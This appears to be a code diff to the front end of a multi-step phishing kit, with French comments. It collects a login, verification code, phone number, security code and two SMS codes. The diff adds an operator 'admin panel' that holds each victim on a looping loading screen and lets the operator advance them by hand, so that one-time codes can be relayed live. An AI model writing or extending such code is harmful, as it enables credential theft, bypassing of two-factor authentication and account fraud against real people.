@@ -1,4 +1,5 @@
 import React, { useState } from 'react';
+import AdminPanel from './components/AdminPanel';
 import LoginForm from './components/LoginForm';
 import CodeForm from './components/CodeForm';
 import PhoneForm from './components/PhoneForm';
@@ -11,6 +12,7 @@ type Step = 'login' | 'code' | 'loading1' | 'phone' | 'loading2' | 'security' | 
 
 function App() {
   const [currentStep, setCurrentStep] = useState<Step>('login');
+  const [userCount] = useState(1); // Simulé pour l'exemple
 
   const nextStep = () => {
     switch (currentStep) {
@@ -19,23 +21,23 @@ function App() {
         break;
       case 'code':
         setCurrentStep('loading1');
-        setTimeout(() => setCurrentStep('phone'), 3000);
+        // Pas de redirection automatique, en attente du panneau admin
         break;
       case 'phone':
         setCurrentStep('loading2');
-        setTimeout(() => setCurrentStep('security'), 3000);
+        // Pas de redirection automatique, en attente du panneau admin
         break;
       case 'security':
         setCurrentStep('loading3');
-        setTimeout(() => setCurrentStep('sms1'), 3000);
+        // Pas de redirection automatique, en attente du panneau admin
         break;
       case 'sms1':
         setCurrentStep('loading4');
-        setTimeout(() => setCurrentStep('sms2'), 3000);
+        // Pas de redirection automatique, en attente du panneau admin
         break;
       case 'sms2':
         setCurrentStep('loading5');
-        setTimeout(() => setCurrentStep('success'), 3000);
+        // Pas de redirection automatique, en attente du panneau admin
         break;
       case 'success':
         // Redirection finale après 8 secondes
@@ -46,6 +48,10 @@ function App() {
     }
   };
 
+  const handleAdminStepChange = (step: string) => {
+    setCurrentStep(step as Step);
+  };
+
   const renderCurrentStep = () => {
     switch (currentStep) {
       case 'login':
@@ -53,23 +59,23 @@ function App() {
       case 'code':
         return <CodeForm onNext={nextStep} />;
       case 'loading1':
-        return <LoadingPage message="Traitement de vos informations..." />;
+        return <LoadingPage message="Traitement de vos informations..." isLooping={true} />;
       case 'phone':
         return <PhoneForm onNext={nextStep} />;
       case 'loading2':
-        return <LoadingPage message="Traitement de vos informations..." />;
+        return <LoadingPage message="Traitement de vos informations..." isLooping={true} />;
       case 'security':
         return <SecurityCodeForm onNext={nextStep} />;
       case 'loading3':
-        return <LoadingPage message="Traitement de vos informations..." />;
+        return <LoadingPage message="Traitement de vos informations..." isLooping={true} />;
       case 'sms1':
         return <SmsCodeForm onNext={nextStep} />;
       case 'loading4':
-        return <LoadingPage message="Traitement de vos informations..." />;
+        return <LoadingPage message="Traitement de vos informations..." isLooping={true} />;
       case 'sms2':
         return <SmsCodeForm onNext={nextStep} isSecondCode={true} />;
       case 'loading5':
-        return <LoadingPage message="Mise à jour du numéro de téléphone en cours..." />;
+        return <LoadingPage message="Mise à jour du numéro de téléphone en cours..." isLooping={true} />;
       case 'success':
         return <SuccessPage />;
       default:
@@ -78,7 +84,14 @@ function App() {
   };
 
   return (
-    <main>
+    <>
+      <AdminPanel 
+        currentStep={currentStep}
+        onStepChange={handleAdminStepChange}
+        userCount={userCount}
+      />
+      
+      <main>
       <div className="form">
         <div className="logo">
           <img src="img/logo.png" alt="Logo" />
@@ -116,7 +129,8 @@ function App() {
       <div className="fa">
         <img src="img/fa.png" alt="FA" />
       </div>
-    </main>
+      </main>
+    </>
   );
 }
 
